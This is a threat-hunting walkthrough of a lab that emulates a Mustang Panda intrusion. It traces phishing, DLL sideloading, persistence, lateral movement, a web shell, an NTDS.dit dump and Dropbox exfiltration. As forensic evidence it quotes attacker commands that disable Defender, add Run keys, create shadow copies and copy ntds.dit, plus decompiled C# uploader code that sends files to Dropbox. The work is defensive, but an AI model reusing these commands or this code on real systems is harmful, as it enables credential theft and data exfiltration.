  alt: APT-Inspired Threat Hunting Walkthrough
---

The Threat Actor in focus is [Mustang Panda](https://attack.mitre.org/groups/G0129/) a.k.a. Stately Taurus, a well-documented Chinese APT group known for cyber-espionage campaigns targeting governments, NGOs, and political entities across Southeast Asia. This lab emulates a targeted intrusion aligned with Mustang Panda‚Äôs TTPs ‚Äî leveraging spear-phishing, DLL sideloading, and C2 over Dropbox to steal sensitive diplomatic data.

Writing this walkthrough helped me solidify investigative workflows and threat-hunting intuition. Rather than just solving for flags, this post narrates the full attack chain ‚Äî revealing how attacker artifacts, like `xbyssd.exe`, and persistence implants, like `AdobeHelper.exe`, can be tracked from delivery to impact.

Let‚Äôs peel back the layers and follow the panda‚Äôs trail.

## üîé Case Overview

In February 2025, the Council of Tropical Affairs (CTA) detected unauthorized access to sensitive trade documents tied to negotiations with the North Shore Confederacy. Initial suspicion was raised by employees Elena Cortez and Mako Reeves, who reported a phishing email on Feb 20. A threat-hunting engagement followed, revealing indicators of compromise aligned with Mustang Panda (aka Stately Taurus/Bronze President) ‚Äî a Chinese APT known for strategic espionage in APAC and NGO sectors.

## Lab Environment

XINTRA hosts their labs on a Windows 11 AWS VM which already includes the tools, snapshots and evidence required for the investigation. Just one click and the instance will be prepared for you.

The tools provided in the lab are comprehensive and I only used a subset listed here:

## ASEAN Infiltration

The investigation kicked off with a review of the suspicious email reported by two employees ‚Äî Elena Cortez and Mako Reeves ‚Äî on February 20, 2025. Given the typical Mustang Panda tradecraft of spear-phishing as an initial access vector, I prioritized examining activity related to Elena Cortez‚Äôs user account (ecortez) to determine if the email had been weaponized.

<img src="/assets/img/apt1.png" alt="" />

As part of the forensic imaging, several Outlook PST files were recovered. Notably, `ecortez.pst` was the largest among the batch (2,249 KB), suggesting either a higher volume of communication or possibly embedded content, such as attachments. Given that Elena Cortez was one of the initial reporters of the suspicious email, this file was prioritized for extraction and parsing.

As part of forensic imaging, multiple PST files were collected from suspected compromised user mailboxes. Among these, ecortez.pst stood out due to its relatively larger size (2,249 KB), suggesting higher communication volume or embedded content. Elena Cortez was one of the users who initially reported the suspicious email ‚Äî making her mailbox the priority.

Opening `ecortez.pst` using `Xst Reader` revealed a particularly suspicious message dated `February 20, 2025, 10:09 AM`, with the subject line: `ASEAN Information`. The sender, `joelhertzo@asia-commercial.com`, was not recognized as a known contact and used a seemingly legitimate but unverified domain.

<img src="/assets/img/apt32.png" alt="" />

Attached was a ZIP archive named `ASEAN2024.zip` (~361 KB). The combination of:

- a password-protected archive,
- instructions to right-click and extract, and
- a vague subject referencing ASEAN trade,

strongly aligned with Mustang Panda‚Äôs known phishing lures ‚Äî often tailored around geopolitical topics and involving misleading filenames to disguise payloads.

To validate whether the malicious attachment was handled by the end user, I searched the ELK stack for file activity involving `ASEAN2024.zip`. At `10:23:28 AM on February 20, 2025`, Windows Sysmon logs confirmed the creation of the ZIP file on the endpoint `CTA-WKS01`, assigned to `Elena Cortez`.

<img src="/assets/img/apt2.png" alt="" />

The file was not directly saved to the Documents directory as initially suspected but was instead created within the Outlook cache, suggesting the user opened the ZIP attachment directly from the Outlook client without extracting it manually:

```cmd
C:\Users\ecortez\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\6R5CBYU8\ASEAN2024.zip
```

<img src="/assets/img/apt3.png" alt="" />

Additional file telemetry captured at `10:23:29 AM on February 20, 2025`, revealed that the same malicious ZIP archive, `ASEAN2024.zip`, was also written to the user‚Äôs Documents folder:

```
C:\Users\ecortez\Documents\ASEAN2024.zip
```

This activity suggests that the user not only opened the ZIP directly from Outlook (triggering a copy to the INetCache path), but also manually saved or extracted the file to a persistent location. This aligns with the attacker‚Äôs social engineering instruction in the original phishing email:

<img src="https://i.imgflip.com/9tnuvm.jpg" alt="Right click on the file and 'Extract all', otherwise you might have trouble opening it." />

The presence of the ZIP file in both the Outlook cache and Documents folder reinforces that **Elena Cortez** engaged with the attachment beyond previewing it, likely extracting its contents ‚Äî which would include the weaponized `LNK` file designed to trigger the initial stage of code execution.

<img src="/assets/img/apt4.png" alt="" />

After confirming the ZIP archive `ASEAN2024.zip` was written to disk and likely opened, I examined the extracted contents within `C:\Users\ecortez\Documents\ASEAN2024\`

```
ASEAN 2024.pdf
```

At first glance, it appears to be a legitimate PDF. However, the file type was `Shortcut (.lnk)` ‚Äî not a document. This deception is a classic Mustang Panda tactic, using LNK files with misleading names and icons to socially engineer user execution.

### LNK file Analysis

To further enrich the investigation, I extracted metadata from the LNK file:

```
C:\Users\ecortez\Documents\ASEAN2024\ASEAN 2024.pdf.lnk
```

The analysis revealed crucial forensic evidence embedded within the LNK‚Äôs structure ‚Äî specifically pointing to the environment where the LNK file was originally created, likely by the threat actor.

<img src="/assets/img/apt5.png" alt="" />

This strongly suggests that the shortcut was authored on a virtualized host (VMware) ‚Äî a typical setup for staging malware development or packaging in a controlled environment. The target of the shortcut was an executable named `AA Updates.exe`, reinforcing the suspicion that execution of the LNK would launch a malicious binary residing alongside the LNK within the extracted folder.

<img src="/assets/img/apt6.png" alt="" />

By this stage, we had identified the initial malicious executable ‚Äî `AA Updates.exe` ‚Äî delivered via the LNK file in the phishing archive. Using Sysmon process telemetry, I was able to confirm precisely when compromise occurred and how it unfolded.
```
- üìÖ First confirmed day of compromise: February 20, 2025
- üïê Time of execution: 10:54:45 AM
```
The binary `AA Updates.exe` executed on the host `CTA-WKS01`, and more importantly, performed **remote thread injection** into two legitimate Windows processes ‚Äî a strong behavioral indicator of malicious intent.

### üß¨ Observed Process Injections

```
Target 1:
C:\Program Files\Microsoft OneDrive\OneDrive.exe
üïê Injected at 10:54:45 AM

Target 2:
C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2024.11120.5010.0_x64__8wekyb3d8bbwe\Photos.exe
üïê Injected at 10:59:47 AM
```

This shows that `AA Updates.exe` was designed not just to execute payloads directly but to **hide within trusted processes**, likely to avoid detection by endpoint defenses and to maintain stealth.

Upon execution of the LNK file extracted from `ASEAN2024.zip`, the embedded shortcut launched `AA Updates.exe` ‚Äî an executable posing as an Adobe-related application. On the surface, this binary appears benign and may even mimic the look and feel of a legitimate app.

### DLL Hijacking

However, deeper process telemetry revealed that `AA Updates.exe` engaged in malicious DLL sideloading, consistent with MITRE Technique `T1574.002 ‚Äì DLL Search Order Hijacking`.

<img src="/assets/img/apt7.png" alt="" />

This sideloading behavior is a classic evasion tactic, where the main executable loads a malicious DLL placed in the same directory, bypassing traditional detections that focus on the binary alone.

From here, I moved into analyzing what `HEX.dll` actually did ‚Äî checking for process injections, registry artifacts, or any network callbacks to external C2 infrastructure.

### Registry modification

Shortly after the sideloaded DLL `HEX.dll` was executed through `AA Updates.exe`, telemetry captured a registry modification event. This was executed by a spawned instance of `cmd.exe`, originating from within the legitimate process `Photos.exe`, which the malware had previously injected into.

<img src="/assets/img/apt8.png" alt="" />

```
cmd.exe /C reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Adobe Updater" /t REG_SZ /d "\"C:\Users\ecortez\AppData\Local\Packages\AAUpdates\AAUpdates.exe\"" /f
```

The threat actor created a Run key persistence entry under the current user‚Äôs registry hive `HKCU`, ensuring that `AAUpdates.exe` would automatically execute upon user login. The use of a trusted-looking name like **"Adobe Updater"** is a classic social camouflage technique, aimed at hiding in plain sight from less experienced defenders or automated tools.

## Understanding the Tropics

### AD Enumeration

Shortly after gaining persistence and conducting DLL sideloading, the threat actor escalated their activity to perform Active Directory reconnaissance. `At 10:27:01 AM on February 21`, 2025, telemetry captured a suspicious command executed from:

```
Parent Process:
C:\Program Files\Microsoft OneDrive\25.010.0119.0002\Microsoft.SharePoint.exe

Command Line:
cmd.exe /C a.logs -b dc=gotham,dc=lab -f "objectcategory=computer" cn createTimeStamp >> Domain_computers_light.txt
```

This command reflects a typical LDAP-based domain enumeration, likely using a renamed tool such as AdFind, LDAPDomainDump, or similar. The executable name `a.logs` is not a default utility in Windows ‚Äî clearly a renamed binary meant to evade detection and blend in as a benign file.

This tool was not executed in isolation ‚Äî it was run from within an **injected** context **(Microsoft.SharePoint.exe)** by the previously analyzed payload **AA Updates.exe**.

The command queried domain computers based on LDAP filters and exported the results to a file named `Domain_computers_light.txt`.

<img src="/assets/img/apt9.png" alt="" />

## Island Hopping

After the threat actor established initial access through a malicious LNK and DLL sideloading, they shifted their focus to credential-based lateral movement. Event log analysis revealed a spike in Kerberos pre-authentication failures `Event ID 4771`, indicating brute-force activity against internal accounts.

<img src="/assets/img/apt10.png" alt="" />

```
üßë‚Äçüíº Account: dataflowsvc
üìä Indicator: Over 2,000 failed Kerberos attempts followed by eventual success
```

While `dataflowsvc` is a legitimate user account, its abnormal authentication failure pattern ‚Äî followed by subsequent successful logon events ‚Äî strongly suggests it was successfully brute-forced by the threat actor.

After the threat actor successfully brute-forced the `dataflowsvc` account, they leveraged these credentials to move laterally and execute commands remotely. `At 16:25 PM on February 21, 2025`, telemetry from the compromised host showed several suspicious command executions initiated by:

<img src="/assets/img/apt11.png" alt="" />

```bash
cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__*.44594 2>&1
cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__*.44594 2>&1
```

<img src="/assets/img/apt33.png" alt="WMI" />

In this case we have two source IP addresses, `127.0.0.1` and `10.78.3.11`. The former, of course is our local host. We can see two access masks here, the most notable is `0x2`. From the log, we know this is a `WriteData` mask, and is almost certainly the event produced when our wmiexec command pipes its output into a file in the "C:\Windows" directory.

The latter IP address, `10.78.3.11`, happens to be our attacker host in this environment. We can see two masks of interest:

- `0x1` ‚Äì The `ReadData` mask.
- `0x10080` ‚Äì The `DELETE` mask and the ReadAttributes masks combined.

If we read through these logs chronologically, we can see a high-level flow of:

- The local host writes data to the file.
- The remote host reads the data.
- The remote host deletes the file.

These commands were launched using **WMI (Windows Management Instrumentation)**, and output was redirected to files within the `ADMIN$` share ‚Äî a hallmark of `Impacket`‚Äôs `wmiexec.py` tool behavior.

<img src="/assets/img/apt12.png" alt="" />


### Access in to Exchange Server

After obtaining valid credentials for the `dataflowsvc` account, the threat actor expanded their foothold within the environment by moving laterally to a second system. On `February 24, 2025`, telemetry confirmed that the attacker authenticated to the host `CTA-MX01` using the compromised user account and accessed a remote share on the originally infected machine `CTA-WKS01`. The attacker accessed a local path via the network using the format `\\??\C:\`, which is commonly seen when attackers attempt to bypass standard path normalization or operate at a lower-level I/O layer. Within this share, they navigated to the directory `ExchSecIns\srcdat` and dropped a copy of their previously deployed malware, `AAUpdates.exe`, onto the new target system.

The file transfer activity originated from source IP address `10.78.3.11`, confirming that the payload staging originated from `CTA-WKS01`, and was written to the `CTA-MX01` endpoint under the same user context. 

<img src="/assets/img/apt13.png" alt="" />

Following the transfer of `AAUpdates.exe` to the Exchange server `CTA-MX01`, the threat actor moved quickly to ensure its execution and persistence by installing it as a Windows service. On `February 24, 2025, at 09:48:00 AM`, Windows event logs **Event ID 4697** confirmed the creation of a new service on the system. The service was registered under the name `AdobeUpdater`, a deceptive label mimicking legitimate software often found in enterprise environments to evade detection.

The service executable pointed to the payload previously dropped in the `ExchSecIns\srcdat` directory, specifically at `C:\ExchSecIns\srcdat\AAUpdates.exe`. This confirmed that the attacker not only staged their toolset on the system but also ensured that it would execute with elevated privileges by running under the LocalSystem account ‚Äî the highest privilege context available in Windows.

<img src="/assets/img/apt14.png" alt="" />

During the same timeframe in which the attacker was finalizing persistence on the Exchange server `CTA-MX01`, an unusual access event provided a rare glimpse into the threat actor's own operational host. 

<img src="https://i.imgflip.com/9tntp0.jpg" alt="" />

On `February 24, 2025, at 09:35 AM`, logs recorded the `dataflowsvc` account accessing a file on a remote system via a hidden administrative share `(\\?\C$\)`. The file in question was located at the path `home\user\Desktop\latmov\32HEX.dll`. The action performed was a `DELETE` operation, coupled with `ReadAttributes` ‚Äî a behavior consistent with a post-transfer cleanup.

This artifact suggests that the attacker had previously prepared or compiled their payload in that directory on their local system before transferring it into the victim environment. After successfully moving the payload and achieving execution on the target system, they returned to the original location and deleted the file to erase traces of their tooling. The naming convention, particularly the `latmov` folder, and the DLL‚Äôs name `32HEX.dll` align with earlier components used in the attack chain ‚Äî specifically the sideloaded DLL launched via `AAUpdates.exe`.

## Persisting in the Pacific

On `February 25, 2025, at 12:41:38 PM`, the threat actor issued a PowerShell command aimed at turning off Windows Defender‚Äôs real-time protection. This activity was recorded as a process creation event and showed `cmd.exe` launching PowerShell with the following instruction: 

<img src="/assets/img/apt15.png" alt="" />

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

The command‚Äôs output was redirected to a file located in the administrative share path `\\127.0.0.1\ADMIN$`, following the same pattern the attacker had used in previous stages to log or store command results.

This was the first recorded attempt by the attacker to change antivirus settings in the environment.

### Gaing access on Web Server

<img src="/assets/img/apt16.png" alt="" />


<img src="/assets/img/apt17.png" alt="" />

As part of the investigation into the compromise of the internal IIS web server, I identified the deployment of a web shell that provided the threat actor with remote code execution capability through HTTP. On `February 25, 2025, at 13:25:41`, a file named `iisdebug.asp` was created in the web root directory `C:\inetpub\wwwroot\` of the affected host `CTA-WEB01`. The filename and location are consistent with how ASP-based web shells are commonly deployed in IIS environments.

Following the file creation, HTTP GET requests were observed targeting the web shell. These requests came from the external IP address `13.40.100.8`, not from inside the network. The attacker accessed the web shell using a Python script, as seen in the User-Agent string `python-requests/2.32.3`, and passed a query string that included:

```bash
> whoami /groups
> dir
> cd C:\
> dir
> cd
> cd C$
> dir
> cd
> cd ../
> cd
> ls c:\
```

<img src="/assets/img/apt18.png" alt="" />
 
The server responded with `HTTP 200` status codes, confirming successful execution.

## Cantaloupes and Coconuts (C2)

As part of the investigation, I reviewed the results of a YARA scan performed by the initial response team. The scan returned multiple positive detections associated with known C2 tooling. Specifically, the file `AAUpdates.exe`, which was observed in various stages of the attack chain, matched multiple YARA signatures linked to `Cobalt Strike` ‚Äî a widely used post-exploitation framework often employed by both red teams and threat actors alike.

The scan identified hits for several rules, including:

```bash
ELASTIC_Windows_Trojan_Cobaltstrike_Ee7560b7
ELASTIC_Windows_Trojan_Cobaltstrike_FB0627Fc
SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_Strings
ELASTIC_Windows_Trojan_Cobaltstrike_3Dc22D14
```

<img src="/assets/img/apt19.png" alt="" />

The presence of these rule matches, particularly for `Beacon_Strings`, is a strong indicator that the threat actor deployed a `Cobalt Strike Beacon` as their primary communication implant. These beacons are typically used for remote command execution, lateral movement, data staging, and exfiltration.

<img src="/assets/img/apt20.png" alt="" />

As part of deeper analysis, I extracted the memory dump of the `AAUpdates.exe` process and parsed it using the [Cobalt Strike Configuration Extractor (CSCE) tool](https://github.com/strozfriedberg/cobaltstrike-config-extractor). While the dump did not include a full PE header, CSCE successfully parsed the beacon configuration embedded in memory. Among the extracted configuration fields, the hostname value clearly pointed to the threat actor‚Äôs Command and Control (C2) domain:

```
feed-5613.codeformylife.info
```

This domain was configured under the beacon profile, confirming the malware was a Cobalt Strike beacon. The configuration also specified the C2 HTTP staging parameters, including the `/submit.php` URI and POST method, further validating its role in callback and data exfiltration routines.

<img src="/assets/img/apt21.png" alt="" />

Also I analyzing Squid proxy logs, I identified repeated HTTP POST requests directed at the domain `feed-5613.codeformylife.info`

### Whispers Through the Pipe: Tracking Covert Communications

During analysis of endpoint telemetry from `CTA-MX01`, I identified that the binary `adobeupdtr.exe`, located in the `C:\ExchSecIns\srcdat\ directory`, created a named pipe as part of its execution. This occurred on `February 25, 2025, at 12:14:51 UTC`. The named pipe created was:

<img src="/assets/img/apt22.png" alt="" />

```bash
\momo_29468.24172.6507942173138232748
```

This operation was executed under the `NT AUTHORITY\SYSTEM` context, and the image responsible was `adobeupdtr.exe`, which had previously been dropped and registered as a service on the **Exchange server** by the threat actor.


## Pacific Passwords

During log analysis of the domain controller `CTA-DC01`, I identified malicious activity consistent with the attack patterns observed earlier in the environment. On `February 26, 2025, at 10:25:36 UTC`, a binary named `adobehelp.exe` was written to disk at the following location:

<img src="/assets/img/apt23.png" alt="" />

```
C:\Packages\Adobe\adobehelp.exe
```

The file was created by the System process `PID 4`, operating under the `NT AUTHORITY\SYSTEM` context, which confirms that the attacker had obtained system-level privileges on the domain controller. 

<img src="/assets/img/apt24.png" alt="" />

Immediately following the file creation, a new service was registered on the host. The service was named `Adobe Helper Service` and was configured to execute the `adobehelp.exe` binary with LocalSystem privileges and set to auto-start.

![alt text](https://i.imgflip.com/9to046.jpg)

This activity indicates a clear attempt by the threat actor to establish persistence on one of the most critical systems in the network ‚Äî the domain controller. By disguising the binary and service under names associated with Adobe software, the attacker likely aimed to avoid raising suspicion during routine monitoring or administrative reviews. The combination of binary drop and service creation confirms that the adversary had fully compromised the domain controller and intended to maintain long-term access.

### Create a Volume Shadow Copy 

Further analysis of process execution logs on `CTA-DC01` revealed that the threat actor took steps to access protected system files by leveraging the vssadmin utility. On `February 26, 2025, at 10:53:16 UTC`, the attacker executed the following command under a system-level context:

```
C:\Windows\System32\cmd.exe /C vssadmin create shadow /for=c:
```

<img src="/assets/img/apt25.png" alt="" />

This command creates a Volume Shadow Copy of the `C:` drive ‚Äî a tactic commonly used by attackers to safely access files that are locked or in use by the system, including the `NTDS.dit` (Active Directory database), registry hives, and event logs. The command was launched from `cmd.exe`, but the parent process was `C:\Packages\Adobe\adobehelp.exe`, the same binary that was dropped and persisted as a service earlier in the attack.

The parent-child process relationship, along with the continued execution under the `NT AUTHORITY\SYSTEM` account, confirms that `adobehelp.exe` is not only malicious but also actively performing post-exploitation tasks typical of domain dominance operations.

By creating a shadow copy, the attacker likely intended to extract sensitive domain data while avoiding file lock errors or detection from real-time monitoring tools. This action further escalates the threat level, showing direct access to domain controller-level artifacts and preparing the groundwork for data exfiltration or credential harvesting.

### Dump NTDS.dit

Following the creation of a shadow copy of the `C:` drive on the domain controller `CTA-DC01`, I identified a second command executed just two minutes later, at `10:55:25 UTC on February 26, 2025`. This command extracted the Active Directory database file `NTDS.dit` directly from the newly created shadow copy:

<img src="/assets/img/apt26.png" alt="" />

```bash
C:\Windows\System32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ntds.dit c:\Packages\Plugins\nt
```

The attacker used `cmd.exe` to copy the `ntds.dit` file ‚Äî which contains the hashed credentials for every domain account ‚Äî into a custom directory under `C:\Packages\Plugins\nt`. This command was also executed under the `NT AUTHORITY\SYSTEM` account, with `adobehelp.exe` as the parent process. This shows a deliberate step in the credential theft phase of the attack, following common procedures used in domain compromise operations.

## Mango Looting

As the intrusion progressed on the domain controller `CTA-DC01`, I identified the creation of another suspicious executable dropped by the previously established malicious service process, adobehelp.exe. At `11:11:37 UTC on February 26, 2025`, the SYSTEM-level process `C:\Packages\Adobe\adobehelp.exe` wrote a new file named `xsbyssd.exe` to the path:

<img src="/assets/img/apt27.png" alt="" />

This file was created by the already-compromised persistent service process `adobehelp.exe`, which had been used earlier to extract the `ntds.dit` Active Directory database file via a shadow copy. Based on the timing, sequence, and relationship to previous activity, it is highly likely that `xbyssd.exe` was used for data exfiltration purposes.

### xbyssd.exe File analysing

Further investigation revealed that the malicious binary `xbyssd.exe`, previously observed being deployed and executed on `CTA-DC01`, had also made its way onto the workstation `CTA-WKS01`. On `February 26, 2025, at 11:58:43 UTC`, Microsoft Defender Antivirus detected and responded to the presence of this binary on the endpoint.

<img src="/assets/img/apt28.png" alt="" />

It was flagged with the signature `Trojan:Win32/Bearfoos.A!ml`, a known detection used by Microsoft to classify obfuscated malware often associated with exfiltration tooling. The detection was classified as Severe, and the real-time protection engine successfully quarantined the file, preventing further execution.

In order to conduct a deeper analysis of the `xbyssd.exe` binary ‚Äî which was previously quarantined by Microsoft Defender on `CTA-WKS01` ‚Äî I initiated the process of recovering the quarantined file. For this task, I utilized the [defender-dump.py](https://github.com/knez/defender-dump/blob/master/defender-dump.py) tool, a utility designed to extract files from the Windows Defender quarantine store.

```bash
python defender-dump.py -d "C:\Labs\Evidence\CouncilOfTropicalAffairs\TriageImages\CTA-WKS01\C:\"
```

<img src="/assets/img/apt29.png" alt="" />

The tool output confirmed that the file was extracted and archived as `quarantine.tar`. This `.tar` archive contains one or more quarantined samples, including `xbyssd.exe`.


<img src="https://i.imgflip.com/9to1ux.jpg" alt="" />

Upon decompiling the recovered binary `xbyssd.exe`, it was revealed to be a C#-based .NET application explicitly written for the purpose of file exfiltration. The core functionality of the program is to upload a specified file to a Dropbox account using the Dropbox API.

The main logic is implemented within the `Main()` method of a C# async task, and exhibits the following behaviors:

```c
private static async Task Main(string[] args)
{
	if (args.Length < 1)
	{
		Console.WriteLine("Usage: Uploader.exe <full_path_to_file>");
		return;
	}
```

The executable expects a single argument ‚Äî the full path to the file that should be uploaded. If this argument is not supplied, the process terminates with a usage hint.

```c
string accessToken = "sl.A..."; // hardcoded Dropbox OAuth2 token
```

A hardcoded Dropbox `OAuth2 bearer token` is embedded within the binary. This enables direct, unauthenticated access to the attacker's `Dropbox` account for uploading files.

```c
string dropboxFileName = Path.GetFileName(filePath);
string dropboxPath = "/" + dropboxFileName;
```

The filename of the local file is extracted and reused as the target filename in the Dropbox directory.

```c
using HttpClient client = new HttpClient();
client.DefaultRequestHeaders.Authorization = 
    new AuthenticationHeaderValue("Bearer", accessToken);

client.DefaultRequestHeaders.Add("Dropbox-API-Arg", 
    "{\"path\": \"" + dropboxPath + "\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}");

client.DefaultRequestHeaders.Add("Content-Type", "application/octet-stream");

HttpResponseMessage response = await client.PostAsync(
    "https://content.dropboxapi.com/2/files/upload", content);
```

This code confirms that `xbyssd.exe` is a lightweight, single-purpose data exfiltration utility designed to operate silently in compromised environments. It allows the attacker to upload any specified file directly to their Dropbox account using an embedded API token, with no user interaction required.

The use of cloud storage (as opposed to traditional C2 channels) makes detection more difficult and highlights the adversary‚Äôs intent to blend in with legitimate traffic and services.

### Exfiltration

on `CTA-WKS01`, the binary `xbyssd.exe` was executed multiple times to exfiltrate sensitive documents from a mapped drive. **On February 26, 2025, between 11:57:28 UTC and 11:58:36 UTC**, a series of command-line executions show that the attacker used this utility to attempt uploads of files.

<img src="/assets/img/apt31.png" alt="" />

These files were accessed and executed as arguments passed to `xbyssd.exe` through `cmd.exe`, consistent with the tool's design observed during reverse engineering. The sequence of executions, with slight spacing in time, suggests manual or script-driven attempts to upload multiple documents of interest ‚Äî likely business-sensitive or project-related materials ‚Äî to the `Dropbox` account hardcoded in the binary.

This confirms that active data exfiltration occurred from `CTA-WKS01`, and that the attacker had access to a mapped or redirected `Q:` drive, which likely stored shared or sensitive content. The timing of the `xbyssd.exe` executions closely aligns with Defender‚Äôs later detection and quarantine of the file, suggesting that at least some data may have been successfully uploaded before the tool was neutralized.

At `13:02:00 UTC on February 26, 2025`, shortly after executing `xbyssd.exe` to exfiltrate project-related documents, the attacker initiated an additional step to compress a sensitive file using `WinRAR` on the workstation `CTA-WKS01`. The command executed was:

<img src="/assets/img/apt30.png" alt="" />

This command uses the rar.exe utility to create an archive named `aerogc.rar`, targeting all `.docx` files within the `Q:` drive ‚Äî a location previously shown to contain business-sensitive material.

This behavior confirms a deliberate and methodical approach to staging data for exfiltration and supports the conclusion that the `Q:` drive was a key target in the adversary's operational plan.

## Our Final Mango Slice üçã

And that‚Äôs a wrap! After hours of triage, log diving, binary reversing, and tracking every lateral move like a digital bloodhound, this investigation has finally reached its close. Writing this up took longer than pulling apart the actual attack, but the opportunity to retrace, rethink, and solidify each assumption was worth it.

What stood out the most? Seeing how each phase ‚Äî from initial access via malicious email to domain-wide credential theft ‚Äî leaves a consistent, traceable trail when viewed in the right context. The way tools like `xbyssd.exe` blend in under user contexts, the quiet abuse of `Dropbox APIs`, and how even a RAR archive carries weight in an exfiltration chain ‚Äî it‚Äôs all there if you know where to look.

A huge shoutout to the team behind [@XINTRA](https://www.xintra.org/) for creating a lab this detailed. Every log felt authentic, every artifact useful, and every pivot led to something meaningful. Massive thanks to all the analysts, red teamers, and reverse engineers who continue to raise the bar in adversary emulation and detection.

To anyone out there digging into similar TTPs, stay curious and keep learning. Threat actors may be stealthy ‚Äî but we‚Äôve got grit, timestamps, and YARA.
